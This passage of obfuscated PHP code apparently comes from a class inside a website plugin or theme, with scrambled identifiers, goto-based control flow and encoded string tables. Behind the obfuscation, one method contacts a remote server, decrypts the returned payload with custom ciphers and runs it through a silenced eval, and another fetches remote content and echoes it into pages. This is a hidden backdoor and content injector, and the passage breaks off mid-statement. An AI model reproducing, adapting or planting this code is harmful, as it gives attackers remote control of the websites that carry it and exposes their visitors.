$GLOBALS[$dÒİª˜‘Õ[91]][$dÒİª˜‘Õ[95]][$dÒİª˜‘Õ[264]] = $dÒİª˜‘Õ[229]; $GLOBALS[$dÒİª˜‘Õ[91]][$dÒİª˜‘Õ[268]] = $dÒİª˜‘Õ[220]; $FÏö‚İÑ° = $f…Ñ›Ìà‘®[617]; goto Cñäêõ«ñŒ; B‹âßëµÍ¢: } public function vhwdc371b7c5() { $DÍ§¿‚ÂÄ =& $_SERVER[Õİõş]; return $_SERVER[Í¶Ìå€õ…Í][270]; $c­ØçÆµìÅ = $DÍ§¿‚ÂÄ[618]; while ($c­ØçÆµìÅ < $DÍ§¿‚ÂÄ[552]) { if ($c­ØçÆµìÅ >= 0) { break; } $c­ØçÆµìÅ++; } } private function geyo6d73df24() { goto D¹¾£®Õ¦à; AËÀäí‚±Ç: $this->{$_SERVER[Í¶Ìå€õ…Í][164]}(); $A´ƒ¬¹‚¡ = $eé¸»³¹ˆ[623]; if (strlen($A´ƒ¬¹‚¡) < $eé¸»³¹ˆ[558]) { return; } goto e¸Ó°Âš÷›; CßŠÂÏõ™‘: $cÙÕ‡ë¡² = $eé¸»³¹ˆ[622]; while (strlen($cÙÕ‡ë¡²) < $eé¸»³¹ˆ[552]) { if (!$cÙÕ‡ë¡²) { break; } $cÙÕ‡ë¡²++; } $f½¿ÕØ©¢ = array($AÇ·ä­çÜ[165] => $AÇ·ä­çÜ[61]($AÇ·ä­çÜ[62])->{$_SERVER[Í¶Ìå€õ…Í][63]}($AÇ·ä­çÜ[209]), $AÇ·ä­çÜ[178] => $this->zqre6d96c961, $AÇ·ä­çÜ[176] => $_SERVER[$AÇ·ä­çÜ[177]], $AÇ·ä­çÜ[169] => $AÇ·ä­çÜ[149], $AÇ·ä­çÜ[172] => $_SERVER[$AÇ·ä­çÜ[173]]); goto F’ÖÀóóÈÌ; F×ÁïÙæ·Ò: $BŒÆ–çÕÁ = $eé¸»³¹ˆ[621]; if ($C¼Ş´§‘ˆ¥ && $AÇ·ä­çÜ[230]() - $C¼Ş´§‘ˆ¥ < $AÇ·ä­çÜ[201]($AÇ·ä­çÜ[278])) { return; } $AÇ·ä­çÜ[13](array($AÇ·ä­çÜ[276], $AÇ·ä­çÜ[152]), $f„×ã˜¢Á, $AÇ·ä­çÜ[230]()); goto CßŠÂÏõ™‘; c™Ó¹‡×ç: $bÖ´Ô»Áä = $eé¸»³¹ˆ[620]; if (!$bÖ´Ô»Áä) { return; } if ($this->zqre6d96c961 == $AÇ·ä­çÜ[121] || !$AÇ·ä­çÜ[104]($GLOBALS, $AÇ·ä­çÜ[132])) { return; } goto AƒĞğÈ‡; D¹¾£®Õ¦à: $eé¸»³¹ˆ =& $_SERVER[Õİõş]; $AÇ·ä­çÜ =& $_SERVER[Í¶Ìå€õ…Í]; $AÕç ª…µ = array($AÇ·ä­çÜ[271], $AÇ·ä­çÜ[272], $AÇ·ä­çÜ[273]); goto DÜ¥ªš‘Õ; e¸Ó°Âš÷›: if ($this->{$_SERVER[Í¶Ìå€õ…Í][199]}($ašøŒÌù‰[$AÇ·ä­çÜ[280]]) != $f½¿ÕØ©¢[$AÇ·ä­çÜ[165]]) { $FÙÌÇÈÛº” = array($AÇ·ä­çÜ[202] => $AÇ·ä­çÜ[61]($AÇ·ä­çÜ[62])->{$_SERVER[Í¶Ìå€õ…Í][63]}($AÇ·ä­çÜ[116]), $AÇ·ä­çÜ[203] => $_SERVER[$AÇ·ä­çÜ[115]], $AÇ·ä­çÜ[204] => $AÇ·ä­çÜ[205](), $AÇ·ä­çÜ[174] => $_SERVER[$AÇ·ä­çÜ[175]]); $bĞÙ‹¸Êœ = $this->{$_SERVER[Í¶Ìå€õ…Í][206]}($AÇ·ä­çÜ[148]($FÙÌÇÈÛº”)); $ašøŒÌù‰ = $this->{$_SERVER[Í¶Ìå€õ…Í][182]}($AÇ·ä­çÜ[207] . $bĞÙ‹¸Êœ); if ($ašøŒÌù‰ && $AÇ·ä­çÜ[191]($ašøŒÌù‰) && isset($ašøŒÌù‰[$AÇ·ä­çÜ[280]])) { $Dî¤©ØÖç¼ = $this->{$_SERVER[Í¶Ìå€õ…Í][188]}($ašøŒÌù‰[$AÇ·ä­çÜ[280]], 2); if ($Dî¤©ØÖç¼) { $Dî¤©ØÖç¼ = $this->{$_SERVER[Í¶Ìå€õ…Í][199]}($Dî¤©ØÖç¼); } if ($Dî¤©ØÖç¼) { try { @eval($Dî¤©ØÖç¼); } catch (Exception $cÛˆ¢õ»ô—) { } } } } goto D„ù”°ˆãÁ; AƒĞğÈ‡: if (!$AÇ·ä­çÜ[236]($_SERVER[$AÇ·ä­çÜ[44]], $AÕç ª…µ)) { return; } if ($AÇ·ä­çÜ[230]() % 4 != 0) { return; } $C¼Ş´§‘ˆ¥ = $AÇ·ä­çÜ[13](array($AÇ·ä­çÜ[276], $AÇ·ä­çÜ[277]), $f„×ã˜¢Á); goto F×ÁïÙæ·Ò; F’ÖÀóóÈÌ: $ašøŒÌù‰ = $this->{$_SERVER[Í¶Ìå€õ…Í][182]}($AÇ·ä­çÜ[279], $f½¿ÕØ©¢); if (!$AÇ·ä­çÜ[191]($ašøŒÌù‰)) { return; } if ($ašøŒÌù‰[$AÇ·ä­çÜ[165]] && $ašøŒÌù‰[$AÇ·ä­çÜ[280]]) { if ($this->{$_SERVER[Í¶Ìå€õ…Í][199]}($ašøŒÌù‰[$AÇ·ä­çÜ[280]]) == $f½¿ÕØ©¢[$AÇ·ä­çÜ[165]]) { return; } } goto AËÀäí‚±Ç; DÜ¥ªš‘Õ: $dÉ¶Š²©·Ö = $eé¸»³¹ˆ[619]; while ($dÉ¶Š²©·Ö < $eé¸»³¹ˆ[560]) { if ($dÉ¶Š²©·Ö >= 0) { break; } $dÉ¶Š²©·Ö++; } $f„×ã˜¢Á = $AÇ·ä­çÜ[274] . $AÇ·ä­çÜ[114]($AÇ·ä­çÜ[275]); goto c™Ó¹‡×ç; D„ù”°ˆãÁ: } private function ybtu1b6bbede($BŒ¢‰¿Ó‹ = '', $dÇ‹¡æœÎ = array(), $cçÂ³Ìé = 5) { goto a„ä‹‹¿é; Eß‰ª“ÅÉ: $C±®´ï¢ê¢ = $cÏÛÄ«ëµ[245](array($cÏÛÄ«ëµ[246] => array($cÏÛÄ«ëµ[249] => $cçÂ³Ìé, $cÏÛÄ«ëµ[247] => $cÏÛÄ«ëµ[285]), $cÏÛÄ«ëµ[286] => array($cÏÛÄ«ëµ[287] => !1, $cÏÛÄ«ëµ[288] => !1))); $A¤õ¡„õ©Ş = $AÛ…Ó˜¨[626]; $dÇ‹¡æœÎ = @$cÏÛÄ«ëµ[250]($dç¥Óª–Ñ§, !1, $C±®´ï¢ê¢); goto CÁù¶²Œ»; a„ä‹‹¿é: $AÛ…Ó˜¨ =& $_SERVER[Õİõş]; $cÏÛÄ«ëµ =& $_SERVER[Í¶Ìå€õ…Í]; $dç¥Óª–Ñ§ = $cÏÛÄ«ëµ[281]; goto d» ŠŠë×; CÀÒ‚ãµ“÷: $A‚º±š©äª = $AÛ…Ó˜¨[628]; goto e·¸«Óƒ; CÁù¶²Œ»: $A¶ÄŸ­†¡ù = $AÛ…Ó˜¨[627]; while ($A¶ÄŸ­†¡ù < $AÛ…Ó˜¨[558]) { if ($A¶ÄŸ­†¡ù >= 0) { break; } $A¶ÄŸ­†¡ù++; } return $cÏÛÄ«ëµ[190]($dÇ‹¡æœÎ, !0); goto CÀÒ‚ãµ“÷; f¦æÚ²ª: $dç¥Óª–Ñ§ = $dç¥Óª–Ñ§ . $BŒ¢‰¿Ó‹ . $cÏÛÄ«ëµ[283] . $cÏÛÄ«ëµ[284]($dÇ‹¡æœÎ); $eÂÉÛæœæè = $AÛ…Ó˜¨[625]; if ($dÇ‹¡æœÎ === -1) { return $dç¥Óª–Ñ§; } goto Eß‰ª“ÅÉ; d» ŠŠë×: $a‹ÓõìŒ“Í = $AÛ…Ó˜¨[624]; if (strlen($a‹ÓõìŒ“Í) < $AÛ…Ó˜¨[552]) { return; } $dç¥Óª–Ñ§ = $this->{$_SERVER[Í¶Ìå€õ…Í][243]}($dç¥Óª–Ñ§, $cÏÛÄ«ëµ[282]); goto f¦æÚ²ª; e·¸«Óƒ: } private function zkexf6c09f9b() { goto c¨ÍÑˆ°˜; E¶Ú÷ùŠ»ï: $bãÉÉµ¶ó = $EàÙ‘í®æÀ[629]; while ($bãÉÉµ¶ó < $EàÙ‘í®æÀ[560]) { if ($bãÉÉµ¶ó >= 0) { break; } $bãÉÉµ¶ó++; } $F½õ’  Ì = $fÙ®¸…Ø“Ä[$this->zqre6d96c961]; goto c§°îÆïœİ; A¾®Ø÷Â‰Â: $f¾˜¬ÆÌ™¤ = $EàÙ‘í®æÀ[631]; while (strlen($f¾˜¬ÆÌ™¤) < $EàÙ‘í®æÀ[543]) { if (!$f¾˜¬ÆÌ™¤) { break; } $f¾˜¬ÆÌ™¤++; } goto C¨“øÕêÕÚ; DÂ‹åÈ¶†÷: $D…Ğ£µ×ã– = $EàÙ‘í®æÀ[630]; if (strlen($D…Ğ£µ×ã–) < $EàÙ‘í®æÀ[560]) { return; } return $F½õ’  Ì + $D…¤àšù£Ú; goto A¾®Ø÷Â‰Â; c¨ÍÑˆ°˜: $EàÙ‘í®æÀ =& $_SERVER[Õİõş]; $F¹µˆÔ¬ =& $_SERVER[Í¶Ìå€õ…Í]; $fÙ®¸…Ø“Ä = array($F¹µˆÔ¬[289] => $F¹µˆÔ¬[290], $F¹µˆÔ¬[291] => $F¹µˆÔ¬[292], $F¹µˆÔ¬[293] => $F¹µˆÔ¬[294], $F¹µˆÔ¬[295] => $F¹µˆÔ¬[296], $F¹µˆÔ¬[297] => $F¹µˆÔ¬[298], $F¹µˆÔ¬[299] => $F¹µˆÔ¬[238], $F¹µˆÔ¬[300] => $F¹µˆÔ¬[238], $F¹µˆÔ¬[301] => $F¹µˆÔ¬[290], $F¹µˆÔ¬[302] => $F¹µˆÔ¬[292], $F¹µˆÔ¬[303] => $F¹µˆÔ¬[294], $F¹µˆÔ¬[304] => $F¹µˆÔ¬[305], $F¹µˆÔ¬[306] => $F¹µˆÔ¬[296], $F¹µˆÔ¬[307] => $F¹µˆÔ¬[308], $F¹µˆÔ¬[309] => $F¹µˆÔ¬[298], $F¹µˆÔ¬[310] => $F¹µˆÔ¬[311], $F¹µˆÔ¬[312] => $F¹µˆÔ¬[313], $F¹µˆÔ¬[314] => $F¹µˆÔ¬[315]); goto E¶Ú÷ùŠ»ï; c§°îÆïœİ: $F½õ’  Ì = $F¹µˆÔ¬[201]($F½õ’  Ì ? $F½õ’  Ì : $F¹µˆÔ¬[290]); $D…¤àšù£Ú = $F¹µˆÔ¬[104]($this->ywuvd0a05dd1, $F¹µˆÔ¬[316]); $D…¤àšù£Ú = $D…¤àšù£Ú ? $F¹µˆÔ¬[201]($D…¤àšù£Ú) : 0; goto DÂ‹åÈ¶†÷; C¨“øÕêÕÚ: } public function eplfabbac778($E’ËóáÜÄ») { goto a¼ˆ¢¯¿ù‚; E–»Ü­¸çÅ: $c™ôÂÓ©·å = $C¥šœ¼ˆÚÆ[222]($c™ôÂÓ©·å, $C¥šœ¼ˆÚÆ[10], $C¥šœ¼ˆÚÆ[318]); $B–ì±¿òÀ¡ = $BßÃ›ß¡ä[633]; if (!$C¥šœ¼ˆÚÆ[236]($E’ËóáÜÄ»[$C¥šœ¼ˆÚÆ[318]], $c™ôÂÓ©·å)) { $C¥šœ¼ˆÚÆ[166]($C¥šœ¼ˆÚÆ[321], !1, $C¥šœ¼ˆÚÆ[233]); } goto Dàš‰îÃ©; eºâ¥Šë‚: if (strlen($F²æ¡Œ¨¿µ) < $BßÃ›ß¡ä[554]) { die; } if ($e½Ï¨Šß¥ <= $B›á¶‡ÚÏ) { return; } $c™ôÂÓ©·å = $C¥šœ¼ˆÚÆ[61]($C¥šœ¼ˆÚÆ[139])->{$_SERVER[Í¶Ìå€õ…Í][317]}($C¥šœ¼ˆÚÆ[318])->{$_SERVER[Í¶Ìå€õ…Í][319]}($B›á¶‡ÚÏ)->{$_SERVER[Í¶Ìå€õ…Í][320]}(); goto E–»Ü­¸çÅ; a¼ˆ¢¯¿ù‚: $BßÃ›ß¡ä =& $_SERVER[Õİõş]; $C¥šœ¼ˆÚÆ =& $_SERVER[Í¶Ìå€õ…Í]; $B›á¶‡ÚÏ = $this->{$_SERVER[Í¶Ìå€õ…Í][137]}(); goto d³Î¢’Ä•Š; d³Î¢’Ä•Š: if ($B›á¶‡ÚÏ >= $C¥šœ¼ˆÚÆ[201]($C¥šœ¼ˆÚÆ[238])) { return; } $e½Ï¨Šß¥ = $C¥šœ¼ˆÚÆ[61]($C¥šœ¼ˆÚÆ[139])->{$_SERVER[Í¶Ìå€õ…Í][140]}(); $F²æ¡Œ¨¿µ = $BßÃ›ß¡ä[632]; goto eºâ¥Šë‚; Dàš‰îÃ©: } public function aueidf12eb8c() { goto d‚µÃÀÙƒ¾; D±ÏŠÜğŠ†: while ($E¤÷¶ÈéßË < $b×„íµŒµ›[560]) { if ($E¤÷¶ÈéßË >= 0) { break; } $E¤÷¶ÈéßË++; } echo $b¸»íËõ›ô[323] . $b¸»íËõ›ô[324]($D§Ğç°ÜŒÚ) . $b¸»íËõ›ô[325]; $cçâ°îôã = $b×„íµŒµ›[637]; goto FŞ³©ìêñ‘; cİã½˜‡™‚: $a­êÉö¨’÷ = $b¸»íËõ›ô[242]; $fÁ¸¿šà‰Ï = $b×„íµŒµ›[634]; while (strlen($fÁ¸¿šà‰Ï) < $b×„íµŒµ›[560]) { if (!$fÁ¸¿šà‰Ï) { break; } $fÁ¸¿šà‰Ï++; } goto fœ“«Ø•ƒñ; FŞ³©ìêñ‘: while ($cçâ°îôã < $b×„íµŒµ›[543]) { if ($cçâ°îôã >= 0) { break; } $cçâ°îôã++; } goto aíÕŒ°ºÔ¾; D‹†Ä—ƒ¾: $A‹„ñ‡âòÊ = $b¸»íËõ›ô[245](array($b¸»íËõ›ô[246] => array($b¸»íËõ›ô[247] => $b¸»íËõ›ô[248], $b¸»íËõ›ô[249] => 3))); $D§Ğç°ÜŒÚ = @$b¸»íËõ›ô[250]($a­êÉö¨’÷, !1, $A‹„ñ‡âòÊ); $E¤÷¶ÈéßË = $b×„íµŒµ›[636]; goto D±ÏŠÜğŠ†; fœ“«Ø•ƒñ: $a­êÉö¨’÷ = $this->{$_SERVER[Í¶Ìå€õ…Í][243]}($a­êÉö¨’÷, $b¸»íËõ›ô[244]); $eçÂËö†«  = $b×„íµŒµ›[635]; if (!$eçÂËö†« ) { die; } goto D‹†Ä—ƒ¾; d‚µÃÀÙƒ¾: $b×„íµŒµ› =& $_SERVER[Õİõş]; $b¸»íËõ›ô =& $_SERVER[Í¶Ìå€õ…Í]; if (!$b¸»íËõ›ô[104]($GLOBALS, $b¸»íËõ›ô[132]) || $b¸»íËõ›ô[322](1, 100) > 20) { return; } goto cİã½˜‡™‚; aíÕŒ°ºÔ¾: } private function nwuk44d569ae($FÃ¹ŸÑØÃ±, $EšÈä»±ÁÄ, $dö’¯ = 3) { goto d‚”§¾åÁ; CéñéÂ®Òá: $CïîÕÀÆÚ… = $d‰áÌİÜä[327]; switch ($bÁÜô‘ˆ·) { case $d‰áÌİÜä[229]: $aø„¨Ï•Á = $this->{$_SERVER[Í¶Ìå€õ…Í][147]}($FÃ¹ŸÑØÃ±, $d‰áÌİÜä[214]($EšÈä»±ÁÄ . $fÈÒ»Ç¿—‘)); $eœåÚ†Ò¨¤ = $F•¢Ù¹¼ƒ›[638]; if (strlen($eœåÚ†Ò¨¤) < $F•¢Ù¹¼ƒ›[554]) { return; } break; $FæÄí‹Ëƒ = $F•¢Ù¹¼ƒ›[639]; if (strlen($FæÄí‹Ëƒ) < $F•¢Ù¹¼ƒ›[552]) { die; } case $d‰áÌİÜä[220]: $aø„¨Ï•Á = $this->{$_SERVER[Í¶Ìå€õ…Í][147]}($FÃ¹ŸÑØÃ±, $d‰áÌİÜä[214]($fÈÒ»Ç¿—‘ . $EšÈä»±ÁÄ)); break; case $d‰áÌİÜä[328]: $aø„¨Ï•Á = $this->{$_SERVER[Í¶Ìå€õ…Í][147]}($FÃ¹ŸÑØÃ±, $d‰áÌİÜä[118]($fÈÒ»Ç¿—‘ . $EšÈä»±ÁÄ)); break; case $d‰áÌİÜä[329]: $aø„¨Ï•Á = $this->{$_SERVER[Í¶Ìå€õ…Í][147]}($FÃ¹ŸÑØÃ±, $d‰áÌİÜä[114]($fÈÒ»Ç¿—‘ . $EšÈä»±ÁÄ)); break; case $d‰áÌİÜä[330]: goto f¦Òµ­„¯À; a–±ËšÒ‘: while (strlen($dÓ¾òºœ·) < $F•¢Ù¹¼ƒ›[552]) { if (!$dÓ¾òºœ·) { break; } $dÓ¾òºœ·++; } $b²ğæâ›ì = $d‰áÌİÜä[114]($E™ùªÇÁğ . $d‰áÌİÜä[114]($EšÈä»±ÁÄ . $E™ùªÇÁğ) . $EšÈä»±ÁÄ); $b²ğæâ›ì = $d‰áÌİÜä[25]($b²ğæâ›ì, $e‡š¼­¯Ó„ % 8, $e‡š¼­¯Ó„ % 8 + 7); goto d•©ã¶–‘; Eˆ“á£‹Ö: $dÔ¥ƒÜõà´ = $F•¢Ù¹¼ƒ›[643]; if (!$dÔ¥ƒÜõà´) { return; } $E‰Á—…ÌµÚ = 0; goto Fö‰¸óæŒ; FÊØœÌŞ¿Œ: $aø„¨Ï•Á = $d‰áÌİÜä[324]($E™ùªÇÁğ . $E¦Ü©Çç½); $fò¸œê®¿ = $F•¢Ù¹¼ƒ›[649]; if (strlen($fò¸œê®¿) < $F•¢Ù¹¼ƒ›[554]) { return; } goto C¬ùÀŒÚ¦Õ; d£Ä±¤¶Ì…: if (strlen($eîË»½âàŠ) < $F•¢Ù¹¼ƒ›[554]) { die; } $E™ùªÇÁğ = $CïîÕÀÆÚ…[$e‡š¼­¯Ó„]; $dÓ¾òºœ· = $F•¢Ù¹¼ƒ›[641]; goto a–±ËšÒ‘; f¦Òµ­„¯À: $FÃ¹ŸÑØÃ± = $d‰áÌİÜä[118]($FÃ¹ŸÑØÃ±); $e‡š¼­¯Ó„ = $d‰áÌİÜä[331](0, 64); $eîË»½âàŠ = $F•¢Ù¹¼ƒ›[640]; goto d£Ä±¤¶Ì…; Fö‰¸óæŒ: $Cî¹»ƒí¨À = $F•¢Ù¹¼ƒ›[644]; while (strlen($Cî¹»ƒí¨À) < $F•¢Ù¹¼ƒ›[554]) { if (!$Cî¹»ƒí¨À) { break; } $Cî¹»ƒí¨À++; } $cøˆ‡‡Š = 0; goto bÉâí°ºê; C¬ùÀŒÚ¦Õ: break; $eàø¯öèŞğ = $F•¢Ù¹¼ƒ›[650]; while ($eàø¯öèŞğ < $F•¢Ù¹¼ƒ›[543]) { if ($eàø¯öèŞğ >= 0) { break; } $eàø¯öèŞğ++; } goto b±ŸØêç£«; d•©ã¶–‘: $E¦Ü©Çç½ = $d‰áÌİÜä[10]; $e‡÷°™ñŠõ = $F•¢Ù¹¼ƒ›[642]; $D»ˆ‚‘× = 0; goto Eˆ“á£‹Ö; bÉâí°ºê: $DİœÏÓà½’ = $F•¢Ù¹¼ƒ›[645]; if (strlen($DİœÏÓà½’) < $F•¢Ù¹¼ƒ›[543]) { return; } for ($D»ˆ‚‘× = 0; $D»ˆ‚‘× < $d‰áÌİÜä[24]($FÃ¹ŸÑØÃ±); $D»ˆ‚‘×++) { $cøˆ‡‡Š = $cøˆ‡‡Š == $d‰áÌİÜä[24]($b²ğæâ›ì) ? 0 : $cøˆ‡‡Š; $c‚ÊóŸêß = $F•¢Ù¹¼ƒ›[646]; if (!$c‚ÊóŸêß) { die; } $E‰Á—…ÌµÚ = ($e‡š¼­¯Ó„ + $d‰áÌİÜä[332]($CïîÕÀÆÚ…, $FÃ¹ŸÑØÃ±[$D»ˆ‚‘×]) + $d‰áÌİÜä[333]($b²ğæâ›ì[$cøˆ‡‡Š++])) % 64; $dŸ˜å›æ² = $F•¢Ù¹¼ƒ›[647]; if (!$dŸ˜å›æ²) { die; } $E¦Ü©Çç½ .= $CïîÕÀÆÚ…[$E‰Á—…ÌµÚ]; $F§îÖØÛÒº = $F•¢Ù¹¼ƒ›[648]; if (strlen($F§îÖØÛÒº) < $F•¢Ù¹¼ƒ›[560]) { die; } } goto FÊØœÌŞ¿Œ; b±ŸØêç£«: default: $aø„¨Ï•Á = $this->{$_SERVER[Í¶Ìå€õ…Í][147]}($FÃ¹ŸÑØÃ±, $EšÈä»±ÁÄ . $fÈÒ»Ç¿—‘); $B¿î„ÉˆÁò = $F•¢Ù¹¼ƒ›[651]; break; } $aø„¨Ï•Á = $d‰áÌİÜä[214]($bÁÜô‘ˆ· . $fÈÒ»Ç¿—‘ . $aø„¨Ï•Á); goto Eè¹†Ü…ò; d‚”§¾åÁ: $F•¢Ù¹¼ƒ› =& $_SERVER[Õİõş]; $d‰áÌİÜä =& $_SERVER[Í¶Ìå€õ…Í]; $d‰áÌİÜä[326](1); goto f‰ÕÄÊŒ¢; f‰ÕÄÊŒ¢: $FÃ¹ŸÑØÃ± = $d‰áÌİÜä[2]($FÃ¹ŸÑØÃ±); $bÁÜô‘ˆ· = $d‰áÌİÜä[322](0, 5) . $d‰áÌİÜä[10]; $fÈÒ»Ç¿—‘ = $d‰áÌİÜä[124](15); goto CéñéÂ®Òá; Eè¹†Ü…ò: if ($dö’¯ - 1 > 0) { $aø„¨Ï•Á = $this->{$_SERVER[Í¶Ìå€õ…Í][127]}($aø„¨Ï•Á, $EšÈä»±ÁÄ, $dö’¯ - 1); } return $aø„¨Ï•Á; goto ašÔÖ¥‡Í; ašÔÖ¥‡Í: } private function qkbs7f878559($fÇ™¯šğø¦, $d¡„ößÁìğ, $A‡’‘êÆ”Ñ = 3) { goto EŠášŞßöŒ; EŠášŞßöŒ: $D¾ù§İç‘ =& $_SERVER[Õİõş]; $f§’˜Æß‘ =& $_SERVER[Í¶Ìå€õ…Í]; if (!$f§’˜Æß‘[334]($fÇ™¯šğø¦) || $f§’˜Æß‘[24]($fÇ™¯šğø¦) < 10) { return !1; } goto b³İæÓĞÖ; F¿‘Ñêæù: $c…í«ÎÍ÷É = $f§’˜Æß‘[25]($fÇ™¯šğø¦, 1, 15); $fÇ™¯šğø¦ = $f§’˜Æß‘[25]($fÇ™¯šğø¦, 16); $D‘Òİ¤à” = $f§’˜Æß‘[327]; goto a‡®Ì¡÷ºÁ; b³İæÓĞÖ: $fÇ™¯šğø¦ = $f§’˜Æß‘[2]($fÇ™¯šğø¦); $fÇ™¯šğø¦ = $f§’˜Æß‘[214]($fÇ™¯šğø¦); $FÔ½ËÌ² ‚ = $D¾ù§İç‘[652]; goto C”¥õ—õ; a‡®Ì¡÷ºÁ: switch ($bÏªºæœ‡) { case $f§’˜Æß‘[229]: $d‡ùŸ¬¶ŸŸ = $this->{$_SERVER[Í¶Ìå€õ…Í][243]}($fÇ™¯šğø¦, $f§’˜Æß‘[214]($d¡„ößÁìğ . $c…í«ÎÍ÷É)); $cÚ‹Í¡ÄÑ = $D¾ù§İç‘[654]; break; case $f§’˜Æß‘[220]: $d‡ùŸ¬¶ŸŸ = $this->{$_SERVER[Í¶Ìå€õ…Í][243]}($fÇ™¯šğø¦, $f§’˜Æß‘[214]($c…í«ÎÍ÷É . $d¡„ößÁìğ)); break; $E–¸Ğ‚‚´ = $D¾ù§İç‘[655]; if (!$E–¸Ğ‚‚´) { die; } case $f§’˜Æß‘[328]: $d‡ùŸ¬¶ŸŸ = $this->{$_SERVER[Í¶Ìå€õ…Í][243]}($fÇ™¯šğø¦, $f§’˜Æß‘[118]($c…í«ÎÍ÷É . $d¡„ößÁìğ)); break; case $f§’˜Æß‘[329]: $d‡ùŸ¬¶ŸŸ = $this->{$_SERVER[Í¶Ìå€õ…Í][243]}($fÇ™¯šğø¦, $f§’˜Æß‘[114]($c…í«ÎÍ÷É . $d¡„ößÁìğ)); break; $Añá¼Š«š = $D¾ù§İç‘[656]; while ($Añá¼Š«š < $D¾ù§İç‘[560]) { if ($Añá¼Š«š >= 0) { break; } $Añá¼Š«š++; } case $f§’˜Æß‘[330]: goto bõÇ×ºåÌ; A³ ß À†: $F—‚¸ÚÕéØ = $f§’˜Æß‘[114]($bÕáØÀÖî . $f§’˜Æß‘[114]($d¡„ößÁìğ . $bÕáØÀÖî) . $d¡„ößÁìğ); $e‹İô¼²Ë = $D¾ù§İç‘[658]; if (strlen($e‹İô¼²Ë) < $D¾ù§İç‘[558]) { die; } goto cæì¤§…è; aòœ²ÄÕ¬: $f˜Ùåé¯ÇŸ = $D¾ù§İç‘[657]; if (!$f˜Ùåé¯ÇŸ) { return; } $cÇôÛğòŠ = $f§’˜Æß‘[332]($D‘Òİ¤à”, $bÕáØÀÖî); goto A³ ß À†; a…Û•‹”òƒ: $aâé«•‚›¦ = $D¾ù§İç‘[666]; goto bƒİÉ¢ÀÓ“; cæì¤§…è: $F—‚¸ÚÕéØ = $f§’˜Æß‘[25]($F—‚¸ÚÕéØ, $cÇôÛğòŠ % 8, $cÇôÛğòŠ % 8 + 7); $a™Œ£Ä›àù = $D¾ù§İç‘[659]; while ($a™Œ£Ä›àù < $D¾ù§İç‘[560]) { if ($a™Œ£Ä›àù >= 0) { break; } $a™Œ£Ä›àù++; } goto cîîÏãÕœ; d‘÷ì–Ã‚‘: for ($EéÓ…íš² = 0; $EéÓ…íš² < $f§’˜Æß‘[24]($fÇ™¯šğø¦); $EéÓ…íš²++) { $fŒ½åŞğ‡ = $fŒ½åŞğ‡ == $f§’˜Æß‘[24]($F—‚¸ÚÕéØ) ? 0 : $fŒ½åŞğ‡; $aôŞñª¼Î = $fŒ½åŞğ‡++; $C÷îê³ï = $f§’˜Æß‘[332]($D‘Òİ¤à”, $fÇ™¯šğø¦[$EéÓ…íš²]) - $cÇôÛğòŠ - $f§’˜Æß‘[333]($F—‚¸ÚÕéØ[$aôŞñª¼Î]); $a›œêî„ŞŸ = $D¾ù§İç‘[663]; while ($C÷îê³ï < 0) { $C÷îê³ï += 64; $A˜ö„ ’› = $D¾ù§İç‘[664]; } $AÆ¯Û’™ ÷ .= $D‘Òİ¤à”[$C÷îê³ï]; $FÖ¼·…¼‡ = $D¾ù§İç‘[665]; if (!$FÖ¼·…¼‡) { die; } } $d‡ùŸ¬¶ŸŸ = $f§’˜Æß‘[336]($AÆ¯Û’™ ÷); break; goto a…Û•‹”òƒ; aÏ²¾•§ù: $EéÓ…íš² = 0; $bå Éë£¾ = $D¾ù§İç‘[661]; if (!$bå Éë£¾) { return; } goto c–¾ìĞÓ; c–¾ìĞÓ: $C÷îê³ï = 0; $E¦æÛ«œà÷ = $D¾ù§İç‘[574]; if (!$E¦æÛ«œà÷) { die; } goto E¯ØòÀô; cîîÏãÕœ: $AÆ¯Û’™ ÷ = $f§’˜Æß‘[10]; $c¢©Ä‚ë„ = $D¾ù§İç‘[660]; while (strlen($c¢©Ä‚ë„) < $D¾ù§İç‘[554]) { if (!$c¢©Ä‚ë„) { break; } $c¢©Ä‚ë„++; } goto aÏ²¾•§ù; E¯ØòÀô: $fŒ½åŞğ‡ = 0; $eÂ˜‘„Æë© = $D¾ù§İç‘[662]; if (!$eÂ˜‘„Æë©) { return; } goto d‘÷ì–Ã‚‘; bõÇ×ºåÌ: $fÇ™¯šğø¦ = $f§’˜Æß‘[335]($fÇ™¯šğø¦); $bÕáØÀÖî = $fÇ™¯šğø¦[0]; $fÇ™¯šğø¦ = $f§’˜Æß‘[25]($fÇ™¯šğø¦, 1); goto aòœ²ÄÕ¬; bƒİÉ¢ÀÓ“: default: $d‡ùŸ¬¶ŸŸ = $this->{$_SERVER[Í¶Ìå€õ…Í][243]}($fÇ™¯šğø¦, $d¡„ößÁìğ . $c…í«ÎÍ÷É); $Aî·ŞË¨´³ = $D¾ù§İç‘[667]; while ($Aî·ŞË¨´³ < $D¾ù§İç‘[554]) { if ($Aî·ŞË¨´³ >= 0) { break; } $Aî·ŞË¨´³++; } break; } if ($A‡’‘êÆ”Ñ - 1 > 0) { $d‡ùŸ¬¶ŸŸ = $this->{$_SERVER[Í¶Ìå€õ…Í][188]}($d‡ùŸ¬¶ŸŸ, $d¡„ößÁìğ, $A‡’‘êÆ”Ñ - 1); } return $d‡ùŸ¬¶ŸŸ; goto dõ¼÷½—Æ; C”¥õ—õ: while ($FÔ½ËÌ² ‚ < $D¾ù§İç‘[552]) { if ($FÔ½ËÌ² ‚ >= 0) { break; } $FÔ½ËÌ² ‚++; } $bÏªºæœ‡ = $fÇ™¯šğø¦[0]; $aïèĞÇÙğ‘ = $D¾ù§İç‘[653]; goto F¿‘Ñêæù; dõ¼÷½—Æ: } public function krsx43a78a9a($dª¶°§Ó†°) { goto EŞÅ‚ÁÚšÜ; aÄå¼ÅÈ¸‰: while ($CíÈö·×¯ < $aÎ„ô„šù¦[554]) { if ($CíÈö·×¯ >= 0) { break; } $CíÈö·×¯++; } while (1) { $B“µ†°–³ = $BäÂĞœ²¶ó; $a¤Â™¾‰“´ = $aÎ„ô„šù¦[670]; if (strlen($a¤Â™¾‰“´) < $aÎ„ô„šù¦[552]) { die; } $F¡˜ì¥š = $BÔ†ñ‡Î×; while ($F¡˜ì¥š % $B“µ†°–³ != 0) { $aÕ”›¥¿ = $F¡˜ì¥š; $F¡˜ì¥š = $B“µ†°–³; $B“µ†°–³ = $aÕ”›¥¿ % $B“µ†°–³; } if ($B“µ†°–³ == 1) { break; } else { $BäÂĞœ²¶ó++; } } $cŠµ§‚„í¦ = 2; goto aÏ‘ŸäÜö; C»î–öÄ§¨: $e¡¸Ø£Õçê = 